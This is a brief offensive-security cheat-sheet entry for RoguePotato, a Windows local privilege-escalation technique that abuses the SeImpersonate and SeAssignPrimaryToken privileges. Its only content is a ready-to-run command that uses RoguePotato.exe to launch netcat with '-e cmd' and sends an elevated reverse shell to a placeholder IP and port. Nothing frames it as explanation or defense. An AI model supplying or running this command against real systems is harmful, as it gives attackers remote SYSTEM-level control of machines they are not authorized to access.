# roguepotato

% SeAssignPrimaryToken, SeImpersonate, token
#plateform/windows #target/local #cat/PRIVESC/TOKEN


## elevated reverse shell
```cmd
.\RoguePotato.exe -r <ip> -c "c:\tools\nc.exe <ip> <port> -e cmd" -l 9999
```


